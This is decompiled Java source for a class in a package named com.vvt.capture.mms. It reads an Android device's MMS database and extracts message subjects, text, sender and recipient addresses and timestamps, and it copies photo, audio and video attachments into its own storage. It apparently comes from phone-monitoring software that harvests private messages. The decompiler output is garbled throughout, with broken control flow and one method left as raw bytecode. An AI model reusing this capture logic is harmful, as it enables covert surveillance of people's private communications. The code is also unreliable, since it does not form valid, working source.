package com.vvt.capture.mms.a;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.mms.MmsData;
import com.vvt.capture.mms.MmsData.Direction;
import com.vvt.h.h;
import java.io.File;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

public class b
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private String c;
  
  public b(String paramString)
  {
    this.c = paramString;
  }
  
  private com.vvt.capture.mms.a a(Cursor paramCursor, String paramString)
  {
    Object localObject = new java/lang/StringBuilder;
    ((StringBuilder)localObject).<init>();
    String str1 = "audio_" + paramString + ".amr";
    int i = paramCursor.getColumnIndex("_data");
    String str2 = paramCursor.getString(i);
    localObject = this.c;
    String str3 = com.vvt.y.a.a((String)localObject, str1, "mms");
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    localObject = new byte[0];
    if (str2 != null)
    {
      File localFile = new java/io/File;
      localFile.<init>(str2);
      boolean bool2 = localFile.exists();
      if (bool2) {
        localObject = com.vvt.io.d.c(str2);
      }
    }
    com.vvt.y.a.a((byte[])localObject, str3);
    localObject = new com/vvt/capture/mms/a;
    ((com.vvt.capture.mms.a)localObject).<init>();
    ((com.vvt.capture.mms.a)localObject).a(str1);
    ((com.vvt.capture.mms.a)localObject).b(str3);
    return (com.vvt.capture.mms.a)localObject;
  }
  
  private com.vvt.capture.mms.a a(String paramString1, String paramString2)
  {
    byte[] arrayOfByte = new byte[0];
    Object localObject = new java/io/File;
    ((File)localObject).<init>(paramString1);
    boolean bool = ((File)localObject).exists();
    if (bool) {
      arrayOfByte = com.vvt.io.d.c(paramString1);
    }
    localObject = com.vvt.y.a.a(this.c, paramString2, "mms");
    com.vvt.capture.mms.a locala = new com/vvt/capture/mms/a;
    locala.<init>();
    locala.a(paramString2);
    locala.b((String)localObject);
    com.vvt.y.a.a(arrayOfByte, (String)localObject);
    return locala;
  }
  
  private String a(Cursor paramCursor)
  {
    String str1 = null;
    String str2 = "_data";
    try
    {
      int i = paramCursor.getColumnIndex(str2);
      str1 = paramCursor.getString(i);
      bool = a;
      if (!bool) {}
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool = a;
        if (!bool) {}
      }
    }
    return str1;
  }
  
  private List a(Cursor paramCursor, SQLiteDatabase paramSQLiteDatabase)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    int i = paramCursor.getColumnIndex("_id");
    int k = Integer.parseInt(paramCursor.getString(i));
    i = paramCursor.getColumnIndex("thread_id");
    long l1 = Long.parseLong(paramCursor.getString(i));
    Object localObject1 = new java/util/Date;
    ((Date)localObject1).<init>();
    long l2 = ((Date)localObject1).getTime();
    String str2 = "date";
    int m = paramCursor.getColumnIndex(str2);
    int i1 = -1;
    if (m != i1) {}
    for (;;)
    {
      try
      {
        localObject5 = Long.toString(l2);
        i1 = ((String)localObject5).length();
        localObject6 = paramCursor.getString(m);
        i3 = ((String)localObject6).length();
        i1 -= i3;
        if (i1 >= 0)
        {
          str2 = paramCursor.getString(m);
          l2 = Long.parseLong(str2);
          double d1 = l2;
          double d2 = 10.0D;
          double d3 = i1;
          double d4 = Math.pow(d2, d3) * d1;
          l2 = d4;
        }
        l3 = l2;
      }
      catch (NumberFormatException localNumberFormatException)
      {
        Object localObject8;
        ArrayList localArrayList2;
        StringBuilder localStringBuilder;
        Object localObject9;
        boolean bool7;
        ArrayList localArrayList3;
        try
        {
          int i3;
          int i5;
          String str4;
          i = ((Cursor)localObject7).getCount();
          if (i <= 0)
          {
            boolean bool2 = a;
            if ((!bool2) || (localObject7 != null)) {
              ((Cursor)localObject7).close();
            }
            localObject1 = localArrayList1;
            return (List)localObject1;
            localNumberFormatException = localNumberFormatException;
            l3 = l2;
            continue;
            try
            {
              localObject1 = new java/lang/String;
              localObject4 = "ISO-8859-1";
              localObject7 = ((String)localObject7).getBytes((String)localObject4);
              localObject4 = "UTF-8";
              ((String)localObject1).<init>((byte[])localObject7, (String)localObject4);
              localObject8 = localObject1;
            }
            catch (UnsupportedEncodingException localUnsupportedEncodingException)
            {
              localObject2 = "";
              localObject8 = localObject2;
            }
            continue;
            localObject2 = MmsData.Direction.IN;
            localObject9 = localObject2;
            continue;
          }
          ((Cursor)localObject7).moveToLast();
          Object localObject2 = "ct";
          int j = ((Cursor)localObject7).getColumnIndex((String)localObject2);
          localObject2 = ((Cursor)localObject7).getString(j);
          localObject4 = "_id";
          m = ((Cursor)localObject7).getColumnIndex((String)localObject4);
          localObject4 = ((Cursor)localObject7).getString(m);
          localObject5 = a((Cursor)localObject7);
          bool7 = a;
          if (bool7) {}
          bool7 = a;
          if (bool7) {}
          localObject6 = "text/plain";
          bool7 = ((String)localObject2).equalsIgnoreCase((String)localObject6);
          if (bool7)
          {
            localObject2 = "text";
            j = ((Cursor)localObject7).getColumnIndex((String)localObject2);
            localObject2 = ((Cursor)localObject7).getString(j);
            if (localObject2 != null)
            {
              localObject2 = localStringBuilder.append((String)localObject2);
              localObject4 = " ";
              ((StringBuilder)localObject2).append((String)localObject4);
            }
            bool3 = a;
            if (bool3) {}
            bool3 = ((Cursor)localObject7).moveToPrevious();
            if (bool3) {
              continue;
            }
            if (localObject7 != null) {
              ((Cursor)localObject7).close();
            }
            bool3 = a;
            if (bool3) {}
            localArrayList3 = new java/util/ArrayList;
            localArrayList3.<init>();
            i5 = 2;
            localObject7 = new Object[i5];
            localObject7[0] = "msg_id";
            localObject5 = Integer.valueOf(k);
            localObject7[1] = localObject5;
            localObject5 = String.format("%s = %s", (Object[])localObject7);
            localObject7 = "addr";
            m = 0;
            localObject4 = null;
            bool7 = false;
            localObject6 = null;
            i7 = 0;
            str3 = null;
            str4 = "_id";
            localObject2 = paramSQLiteDatabase;
            localObject2 = paramSQLiteDatabase.query((String)localObject7, null, (String)localObject5, null, null, null, str4);
            if (localObject2 == null) {
              continue;
            }
            boolean bool8 = ((Cursor)localObject2).moveToNext();
            if (!bool8) {
              continue;
            }
            localObject7 = "type";
            int i6 = ((Cursor)localObject2).getColumnIndex((String)localObject7);
            i6 = ((Cursor)localObject2).getInt(i6);
            boolean bool4 = a;
            if (bool4) {}
            localObject4 = MmsData.Direction.IN;
            int n;
            if (localObject9 == localObject4)
            {
              n = 137;
              if (i6 == n) {}
            }
            else
            {
              localObject4 = MmsData.Direction.OUT;
              if (localObject9 != localObject4) {
                continue;
              }
              n = 151;
              if (i6 != n) {
                continue;
              }
            }
            i6 = ((Cursor)localObject2).getColumnIndex("address");
            localObject7 = ((Cursor)localObject2).getString(i6);
            bool5 = a;
            if (bool5) {}
            localArrayList3.add(localObject7);
            continue;
          }
          bool7 = com.vvt.y.a.a((String)localObject2);
          if (bool7)
          {
            localObject2 = c((Cursor)localObject7, (String)localObject4);
            localArrayList2.add(localObject2);
            continue;
          }
          bool7 = com.vvt.y.a.b(str1);
        }
        finally
        {
          if (localObject7 != null) {
            ((Cursor)localObject7).close();
          }
        }
        if (!bool7) {
          continue;
        }
        Object localObject3 = b((Cursor)localObject7, (String)localObject4);
        localArrayList2.add(localObject3);
        continue;
        boolean bool3 = com.vvt.y.a.c((String)localObject3);
        if (!bool3) {
          continue;
        }
        localObject3 = a((Cursor)localObject7, (String)localObject4);
        localArrayList2.add(localObject3);
        continue;
        if (localObject5 == null) {
          continue;
        }
        localObject3 = "%s_%s";
        int i4 = 2;
        Object localObject6 = new Object[i4];
        int i7 = 0;
        String str3 = null;
        localObject6[0] = localObject4;
        boolean bool5 = true;
        str3 = "cl";
        i7 = ((Cursor)localObject7).getColumnIndex(str3);
        str3 = ((Cursor)localObject7).getString(i7);
        localObject6[bool5] = str3;
        localObject3 = String.format((String)localObject3, (Object[])localObject6);
        bool5 = a;
        if (!bool5) {
          continue;
        }
        localObject3 = a((String)localObject5, (String)localObject3);
        localArrayList2.add(localObject3);
        continue;
        if (localObject3 == null) {
          continue;
        }
        ((Cursor)localObject3).close();
        Object localObject4 = localArrayList3.iterator();
        bool3 = ((Iterator)localObject4).hasNext();
        if (!bool3) {
          continue;
        }
        localObject3 = (String)((Iterator)localObject4).next();
        Object localObject7 = h.a((String)localObject3);
        boolean bool6 = a;
        if ((bool6) && (localObject7 == null)) {
          continue;
        }
        Object localObject5 = ((String)localObject7).trim();
        int i2 = ((String)localObject5).length();
        i4 = 1;
        if (i2 >= i4) {
          continue;
        }
        localObject7 = "";
        localObject5 = new com/vvt/capture/mms/MmsData;
        ((MmsData)localObject5).<init>();
        ((MmsData)localObject5).b((String)localObject7);
        ((MmsData)localObject5).a((MmsData.Direction)localObject9);
        long l4 = k;
        ((MmsData)localObject5).a(l4);
        ((MmsData)localObject5).c(l1);
        ((MmsData)localObject5).b(l3);
        ((MmsData)localObject5).c((String)localObject3);
        ((MmsData)localObject5).d((String)localObject8);
        localObject6 = localStringBuilder.toString();
        ((MmsData)localObject5).a((String)localObject6);
        localObject6 = MmsData.Direction.OUT;
        if (localObject9 != localObject6) {
          continue;
        }
        localObject6 = new com/vvt/capture/mms/d;
        ((com.vvt.capture.mms.d)localObject6).<init>();
        ((com.vvt.capture.mms.d)localObject6).b((String)localObject7);
        ((com.vvt.capture.mms.d)localObject6).a((String)localObject3);
        ((MmsData)localObject5).a((com.vvt.capture.mms.d)localObject6);
        localObject7 = localArrayList2.iterator();
        bool3 = ((Iterator)localObject7).hasNext();
        if (!bool3) {
          continue;
        }
        localObject3 = (com.vvt.capture.mms.a)((Iterator)localObject7).next();
        ((MmsData)localObject5).a((com.vvt.capture.mms.a)localObject3);
        continue;
        localArrayList1.add(localObject5);
        continue;
        bool3 = a;
        if (!bool3) {
          continue;
        }
        localObject3 = localArrayList1;
        continue;
      }
      localObject1 = "sub";
      i = paramCursor.getColumnIndex((String)localObject1);
      localObject7 = paramCursor.getString(i);
      if (localObject7 == null)
      {
        localObject1 = "";
        localObject8 = localObject1;
        localArrayList2 = new java/util/ArrayList;
        localArrayList2.<init>();
        localStringBuilder = new java/lang/StringBuilder;
        localStringBuilder.<init>();
        i = paramCursor.getColumnIndex("m_type");
        localObject1 = paramCursor.getString(i);
        i = Integer.parseInt((String)localObject1);
        i5 = 128;
        if (i != i5) {
          continue;
        }
        localObject1 = MmsData.Direction.OUT;
        localObject9 = localObject1;
        localObject1 = new java/lang/StringBuilder;
        ((StringBuilder)localObject1).<init>();
        localObject5 = "mid = " + k;
        m = 0;
        str2 = null;
        i3 = 0;
        localObject6 = null;
        i7 = 0;
        str3 = null;
        str4 = "_id";
        localObject1 = paramSQLiteDatabase;
        localObject7 = paramSQLiteDatabase.query("part", null, (String)localObject5, null, null, null, str4);
      }
      long l3 = l2;
    }
  }
  
  private com.vvt.capture.mms.a b(Cursor paramCursor, String paramString)
  {
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    String str1 = "video_" + paramString + ".3gpp";
    int i = paramCursor.getColumnIndex("_data");
    String str2 = paramCursor.getString(i);
    i = 0;
    localObject1 = new byte[0];
    if (str2 != null)
    {
      localObject2 = new java/io/File;
      ((File)localObject2).<init>(str2);
      bool = ((File)localObject2).exists();
      if (bool) {
        localObject1 = com.vvt.io.d.c(str2);
      }
    }
    str2 = this.c;
    Object localObject2 = "mms";
    str2 = com.vvt.y.a.a(str2, str1, (String)localObject2);
    boolean bool = a;
    if (bool) {}
    com.vvt.y.a.a((byte[])localObject1, str2);
    localObject1 = new com/vvt/capture/mms/a;
    ((com.vvt.capture.mms.a)localObject1).<init>();
    ((com.vvt.capture.mms.a)localObject1).a(str1);
    ((com.vvt.capture.mms.a)localObject1).b(str2);
    return (com.vvt.capture.mms.a)localObject1;
  }
  
  private com.vvt.capture.mms.a c(Cursor paramCursor, String paramString)
  {
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    String str1 = "mms_" + paramString + ".jpg";
    int i = paramCursor.getColumnIndex("_data");
    String str2 = paramCursor.getString(i);
    i = 0;
    localObject1 = new byte[0];
    if (str2 != null)
    {
      localObject2 = new java/io/File;
      ((File)localObject2).<init>(str2);
      bool = ((File)localObject2).exists();
      if (bool) {
        localObject1 = com.vvt.io.d.c(str2);
      }
    }
    str2 = this.c;
    Object localObject2 = "mms";
    str2 = com.vvt.y.a.a(str2, str1, (String)localObject2);
    boolean bool = a;
    if (bool) {}
    com.vvt.y.a.a((byte[])localObject1, str2);
    localObject1 = new com/vvt/capture/mms/a;
    ((com.vvt.capture.mms.a)localObject1).<init>();
    ((com.vvt.capture.mms.a)localObject1).a(str1);
    ((com.vvt.capture.mms.a)localObject1).b(str2);
    return (com.vvt.capture.mms.a)localObject1;
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = a.a();
    if (localObject1 != null)
    {
      bool2 = ((SQLiteDatabase)localObject1).isDbLockedByCurrentThread();
      if (!bool2)
      {
        bool2 = ((SQLiteDatabase)localObject1).isDbLockedByOtherThreads();
        if (!bool2) {
          break label76;
        }
      }
    }
    boolean bool2 = a;
    if ((!bool2) || (localObject1 != null)) {
      ((SQLiteDatabase)localObject1).close();
    }
    localObject1 = localArrayList;
    label76:
    label337:
    label383:
    label393:
    label401:
    for (;;)
    {
      return (List)localObject1;
      Object localObject2 = ((SQLiteDatabase)localObject1).getPath();
      if (localObject2 != null)
      {
        bool2 = a;
        if (!bool2) {}
      }
      localObject2 = "(%s = %d OR %s = %d OR %s = %d)";
      int j = 6;
      try
      {
        localObject3 = new Object[j];
        int k = 0;
        String str1 = null;
        Object localObject4 = "msg_box";
        localObject3[0] = localObject4;
        k = 1;
        int m = 1;
        localObject4 = Integer.valueOf(m);
        localObject3[k] = localObject4;
        k = 2;
        localObject4 = "msg_box";
        localObject3[k] = localObject4;
        k = 3;
        m = 4;
        localObject4 = Integer.valueOf(m);
        localObject3[k] = localObject4;
        k = 4;
        localObject4 = "msg_box";
        localObject3[k] = localObject4;
        k = 5;
        m = 2;
        localObject4 = Integer.valueOf(m);
        localObject3[k] = localObject4;
        str1 = String.format((String)localObject2, (Object[])localObject3);
        String str2 = "_id DESC";
        int i = -1;
        if (paramInt == i) {
          paramInt = -1 >>> 1;
        }
        localObject2 = "pdu";
        j = 0;
        localObject3 = null;
        m = 0;
        localObject4 = null;
        String str3 = Integer.toString(paramInt);
        localObject2 = ((SQLiteDatabase)localObject1).query((String)localObject2, null, str1, null, null, null, str2, str3);
      }
      catch (SQLiteException localSQLiteException)
      {
        Object localObject3;
        Cursor localCursor;
        for (;;)
        {
          boolean bool3 = false;
          localCursor = null;
        }
        boolean bool4 = a;
        if (!bool4) {
          break label337;
        }
        for (;;)
        {
          bool4 = localCursor.moveToNext();
          if (!bool4) {
            break;
          }
          localObject3 = a(localCursor, (SQLiteDatabase)localObject1);
          localArrayList.addAll((Collection)localObject3);
        }
        if (localCursor == null) {
          break label383;
        }
        localCursor.close();
        if (localObject1 == null) {
          break label393;
        }
        ((SQLiteDatabase)localObject1).close();
        bool1 = a;
        if (!bool1) {
          break label401;
        }
        localObject1 = localArrayList;
      }
      if (localObject2 == null)
      {
        bool3 = a;
        if (bool3) {}
        ((SQLiteDatabase)localObject1).close();
        localObject1 = localArrayList;
      }
    }
  }
  
  public List a(g paramg1, g paramg2)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = (Long)paramg1.getReference();
    long l = ((Long)localObject1).longValue();
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    localObject1 = a.a();
    boolean bool2;
    if (localObject1 != null)
    {
      bool2 = ((SQLiteDatabase)localObject1).isDbLockedByCurrentThread();
      if (!bool2)
      {
        bool2 = ((SQLiteDatabase)localObject1).isDbLockedByOtherThreads();
        if (!bool2) {
          break label105;
        }
      }
    }
    boolean bool3 = a;
    if ((!bool3) || (localObject1 != null)) {
      ((SQLiteDatabase)localObject1).close();
    }
    localObject1 = localArrayList;
    label105:
    label379:
    label426:
    label436:
    label444:
    for (;;)
    {
      return (List)localObject1;
      String str = ((SQLiteDatabase)localObject1).getPath();
      if (str != null)
      {
        bool2 = a;
        if (!bool2) {}
      }
      str = "(%s = %d OR %s = %d OR %s = %d) AND %s > %d";
      int i = 8;
      try
      {
        Object[] arrayOfObject = new Object[i];
        int j = 0;
        Object localObject2 = "msg_box";
        arrayOfObject[0] = localObject2;
        j = 1;
        int k = 1;
        localObject2 = Integer.valueOf(k);
        arrayOfObject[j] = localObject2;
        j = 2;
        localObject2 = "msg_box";
        arrayOfObject[j] = localObject2;
        j = 3;
        k = 2;
        localObject2 = Integer.valueOf(k);
        arrayOfObject[j] = localObject2;
        j = 4;
        localObject2 = "msg_box";
        arrayOfObject[j] = localObject2;
        j = 5;
        k = 4;
        localObject2 = Integer.valueOf(k);
        arrayOfObject[j] = localObject2;
        j = 6;
        localObject2 = "_id";
        arrayOfObject[j] = localObject2;
        j = 7;
        localObject3 = Long.valueOf(l);
        arrayOfObject[j] = localObject3;
        str = String.format(str, arrayOfObject);
        localObject3 = "pdu";
        bool4 = false;
        localList = null;
        i = 0;
        arrayOfObject = null;
        j = 0;
        k = 0;
        localObject2 = null;
        localObject3 = ((SQLiteDatabase)localObject1).query((String)localObject3, null, str, null, null, null, null);
      }
      catch (SQLiteException localSQLiteException)
      {
        List localList;
        Cursor localCursor;
        for (;;)
        {
          Object localObject3;
          bool3 = false;
          localCursor = null;
        }
        boolean bool4 = a;
        if (!bool4) {
          break label379;
        }
        for (;;)
        {
          bool4 = localCursor.moveToNext();
          if (!bool4) {
            break;
          }
          localList = a(localCursor, (SQLiteDatabase)localObject1);
          localArrayList.addAll(localList);
        }
        if (localCursor == null) {
          break label426;
        }
        localCursor.close();
        if (localObject1 == null) {
          break label436;
        }
        ((SQLiteDatabase)localObject1).close();
        bool1 = a;
        if (!bool1) {
          break label444;
        }
        localObject1 = localArrayList;
      }
      if (localObject3 == null)
      {
        bool3 = a;
        if (bool3) {}
        ((SQLiteDatabase)localObject1).close();
        localObject1 = localArrayList;
      }
    }
  }
  
  /* Error */
  public boolean a(long paramLong)
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_3
    //   2: ldc -52
    //   4: fstore 4
    //   6: aconst_null
    //   7: astore 5
    //   9: invokestatic 327	com/vvt/capture/mms/a/a:a	()Landroid/database/sqlite/SQLiteDatabase;
    //   12: astore 6
    //   14: aload 6
    //   16: ifnull +27 -> 43
    //   19: aload 6
    //   21: invokevirtual 330	android/database/sqlite/SQLiteDatabase:isDbLockedByCurrentThread	()Z
    //   24: istore 7
    //   26: iload 7
    //   28: ifne +15 -> 43
    //   31: aload 6
    //   33: invokevirtual 333	android/database/sqlite/SQLiteDatabase:isDbLockedByOtherThreads	()Z
    //   36: istore 7
    //   38: iload 7
    //   40: ifeq +52 -> 92
    //   43: getstatic 21	com/vvt/capture/mms/a/removeFromPath:removeFromPath	Z
    //   46: istore 7
    //   48: iload 7
    //   50: ifeq +3 -> 53
    //   53: aload 6
    //   55: ifnull +8 -> 63
    //   58: aload 6
    //   60: invokevirtual 334	android/database/sqlite/SQLiteDatabase:close	()V
    //   63: iconst_0
    //   64: istore 8
    //   66: aconst_null
    //   67: astore 6
    //   69: getstatic 16	com/vvt/capture/mms/a/removeFromPath:a	Z
    //   72: istore 7
    //   74: iload 7
    //   76: ifeq +3 -> 79
    //   79: getstatic 16	com/vvt/capture/mms/a/removeFromPath:a	Z
    //   82: istore 7
    //   84: iload 7
    //   86: ifeq +3 -> 89
    //   89: iload 8
    //   91: ireturn
    //   92: ldc_w 380
    //   95: astore 9
    //   97: iconst_2
    //   98: istore 10
    //   100: iload 10
    //   102: anewarray 4	java/lang/Object
    //   105: astore 11
    //   107: iconst_0
    //   108: istore 12
    //   110: aconst_null
    //   111: astore 13
    //   113: ldc 92
    //   115: astore 14
    //   117: aload 11
    //   119: iconst_0
    //   120: aload 14
    //   122: aastore
    //   123: iconst_1
    //   124: istore 12
    //   126: lload_1
    //   127: invokestatic 378	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   130: astore 14
    //   132: aload 11
    //   134: iload 12
    //   136: aload 14
    //   138: aastore
    //   139: aload 9
    //   141: aload 11
    //   143: invokestatic 212	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   146: astore 13
    //   148: ldc_w 349
    //   151: astore 9
    //   153: iconst_0
    //   154: istore 10
    //   156: aconst_null
    //   157: astore 11
    //   159: aconst_null
    //   160: astore 14
    //   162: aload 6
    //   164: aload 9
    //   166: aconst_null
    //   167: aload 13
    //   169: aconst_null
    //   170: aconst_null
    //   171: aconst_null
    //   172: aconst_null
    //   173: invokevirtual 159	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   176: astore 11
    //   178: aload 11
    //   180: ifnull +170 -> 350
    //   183: aload 11
    //   185: invokeinterface 162 1 0
    //   190: istore 7
    //   192: iload 7
    //   194: ifle +156 -> 350
    //   197: aload 11
    //   199: invokeinterface 217 1 0
    //   204: istore 7
    //   206: iload 7
    //   208: ifeq +142 -> 350
    //   211: iload_3
    //   212: istore 7
    //   214: aload 11
    //   216: ifnull +10 -> 226
    //   219: aload 11
    //   221: invokeinterface 165 1 0
    //   226: aload 6
    //   228: ifnull +8 -> 236
    //   231: aload 6
    //   233: invokevirtual 334	android/database/sqlite/SQLiteDatabase:close	()V
    //   236: iload 7
    //   238: istore 8
    //   240: goto -171 -> 69
    //   243: astore 9
    //   245: iconst_0
    //   246: istore 7
    //   248: aconst_null
    //   249: astore 9
    //   251: getstatic 21	com/vvt/capture/mms/a/removeFromPath:removeFromPath	Z
    //   254: istore 10
    //   256: iload 10
    //   258: ifeq +3 -> 261
    //   261: aload 9
    //   263: ifnull +10 -> 273
    //   266: aload 9
    //   268: invokeinterface 165 1 0
    //   273: aload 6
    //   275: ifnull +8 -> 283
    //   278: aload 6
    //   280: invokevirtual 334	android/database/sqlite/SQLiteDatabase:close	()V
    //   283: iconst_0
    //   284: istore 8
    //   286: aconst_null
    //   287: astore 6
    //   289: goto -220 -> 69
    //   292: astore 9
    //   294: aload 5
    //   296: ifnull +10 -> 306
    //   299: aload 5
    //   301: invokeinterface 165 1 0
    //   306: aload 6
    //   308: ifnull +8 -> 316
    //   311: aload 6
    //   313: invokevirtual 334	android/database/sqlite/SQLiteDatabase:close	()V
    //   316: aload 9
    //   318: athrow
    //   319: astore 9
    //   321: aload 11
    //   323: astore 5
    //   325: goto -31 -> 294
    //   328: astore 11
    //   330: aload 9
    //   332: astore 5
    //   334: aload 11
    //   336: astore 9
    //   338: goto -44 -> 294
    //   341: astore 9
    //   343: aload 11
    //   345: astore 9
    //   347: goto -96 -> 251
    //   350: iconst_0
    //   351: istore 7
    //   353: aconst_null
    //   354: astore 9
    //   356: goto -142 -> 214
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	359	0	this	removeFromPath
    //   0	359	1	paramLong	long
    //   1	211	3	bool1	boolean
    //   4	1	4	f	float
    //   7	326	5	localObject1	Object
    //   12	300	6	localSQLiteDatabase	SQLiteDatabase
    //   24	61	7	bool2	boolean
    //   190	3	7	i	int
    //   204	148	7	bool3	boolean
    //   64	221	8	bool4	boolean
    //   95	70	9	str1	String
    //   243	1	9	localSQLiteException1	SQLiteException
    //   249	18	9	localObject2	Object
    //   292	25	9	localObject3	Object
    //   319	12	9	localObject4	Object
    //   336	1	9	localObject5	Object
    //   341	1	9	localSQLiteException2	SQLiteException
    //   345	10	9	localObject6	Object
    //   98	57	10	j	int
    //   254	3	10	bool5	boolean
    //   105	217	11	localObject7	Object
    //   328	16	11	localObject8	Object
    //   108	27	12	k	int
    //   111	57	13	str2	String
    //   115	46	14	localObject9	Object
    // Exception table:
    //   from	to	target	type
    //   100	105	243	android/database/sqlite/SQLiteException
    //   120	123	243	android/database/sqlite/SQLiteException
    //   126	130	243	android/database/sqlite/SQLiteException
    //   136	139	243	android/database/sqlite/SQLiteException
    //   141	146	243	android/database/sqlite/SQLiteException
    //   172	176	243	android/database/sqlite/SQLiteException
    //   100	105	292	finally
    //   120	123	292	finally
    //   126	130	292	finally
    //   136	139	292	finally
    //   141	146	292	finally
    //   172	176	292	finally
    //   183	190	319	finally
    //   197	204	319	finally
    //   251	254	328	finally
    //   183	190	341	android/database/sqlite/SQLiteException
    //   197	204	341	android/database/sqlite/SQLiteException
  }
  
  public FxSimpleEventReference b()
  {
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    Long localLong = Long.valueOf(c());
    localFxSimpleEventReference.setReference(localLong);
    return localFxSimpleEventReference;
  }
  
  public long c()
  {
    long l = -1;
    boolean bool1 = false;
    localCursor = null;
    localSQLiteDatabase = a.a();
    if (localSQLiteDatabase != null)
    {
      boolean bool2 = localSQLiteDatabase.isDbLockedByCurrentThread();
      if (!bool2)
      {
        bool2 = localSQLiteDatabase.isDbLockedByOtherThreads();
        if (!bool2) {
          break label62;
        }
      }
    }
    bool1 = b;
    if ((!bool1) || (localSQLiteDatabase != null)) {
      localSQLiteDatabase.close();
    }
    for (;;)
    {
      return l;
      label62:
      String str1 = "SELECT MAX(%s) FROM %s";
      int j = 2;
      try
      {
        Object[] arrayOfObject = new Object[j];
        int k = 0;
        String str2 = "_id";
        arrayOfObject[0] = str2;
        k = 1;
        str2 = "pdu";
        arrayOfObject[k] = str2;
        str1 = String.format(str1, arrayOfObject);
        j = 0;
        arrayOfObject = null;
        localCursor = localSQLiteDatabase.rawQuery(str1, null);
        if (localCursor != null)
        {
          int i = localCursor.getCount();
          if (i > 0)
          {
            bool3 = localCursor.moveToNext();
            if (bool3)
            {
              bool3 = false;
              str1 = null;
              l = localCursor.getLong(0);
            }
          }
        }
        if (localCursor != null) {
          localCursor.close();
        }
        if (localSQLiteDatabase == null) {
          break label200;
        }
      }
      catch (SQLiteException localSQLiteException)
      {
        for (;;)
        {
          label200:
          boolean bool3 = b;
          if ((!bool3) || (localCursor != null)) {
            localCursor.close();
          }
          if (localSQLiteDatabase == null) {}
        }
      }
      finally
      {
        if (localCursor == null) {
          break label257;
        }
        localCursor.close();
        if (localSQLiteDatabase == null) {
          break label267;
        }
        localSQLiteDatabase.close();
      }
      localSQLiteDatabase.close();
      bool1 = a;
      if (!bool1) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/mms/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */